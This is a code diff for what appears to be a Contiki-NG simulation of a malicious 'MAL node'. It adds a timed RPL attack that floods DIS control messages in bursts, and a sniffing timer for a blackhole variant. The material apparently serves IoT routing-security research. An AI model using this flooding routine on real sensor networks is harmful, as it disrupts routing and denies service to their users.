@@ -18,9 +18,12 @@
 #define SEND_INTERVAL		  (60 * CLOCK_SECOND)
 
 static struct simple_udp_connection udp_conn;
-#if !MAL_BLACKHOLE
+#if MAL_BLACKHOLE==0
 static void rpl_attack();
  static struct ctimer attack_time;
+ uint16_t numbers=0;
+#elif MAL_BLACKHOLE ==1
+struct etimer time_sniff;
 #endif
 //  static struct etimer mytime;
 
@@ -28,9 +31,6 @@ static void rpl_attack();
 PROCESS(udp_client_process, "MAL node");
 AUTOSTART_PROCESSES(&udp_client_process);
 /*---------------------------------------------------------------------------*/
-
-  uint16_t numbers=0;
-
 static void
 udp_rx_callback(struct simple_udp_connection *c,
          const uip_ipaddr_t *sender_addr,
@@ -50,19 +50,19 @@ udp_rx_callback(struct simple_udp_connection *c,
 
 }
 
-#if !MAL_BLACKHOLE
+#if MAL_BLACKHOLE==0
 static void rpl_attack(void *ptr){
 
   // if (!etimer_expired(&mytime)){
   //   ctimer_reset(&attack_time);
   //   return;
   // }
-    LOG_INFO("Flood att:%d",numbers++);
-   ctimer_reset(&attack_time);
+  LOG_INFO("Flood att:%d\n",numbers++);
+      ctimer_reset(&attack_time);
 
   int i=0;
       //My code
-      while (i<40){
+      while (i<10){
         i++;
         rpl_icmp6_dis_output(NULL);
       }
@@ -96,10 +96,14 @@ PROCESS_THREAD(udp_client_process, ev, data)
 
   etimer_set(&periodic_timer, random_rand() % SEND_INTERVAL);
 
+
   // ctimer_set(&mytime,60*CLOCK_SECOND,rpl_attack,NULL);
-  #if !MAL_BLACKHOLE
+  #if MAL_BLACKHOLE==0
+  LOG_INFO("prepare\n");
   ctimer_set(&attack_time,30*CLOCK_SECOND,rpl_attack,NULL);
-  #endif
+  #elif MAL_BLACKHOLE==1
+    etimer_set(&time_sniff, (120*CLOCK_SECOND));
+#endif
 
 
 
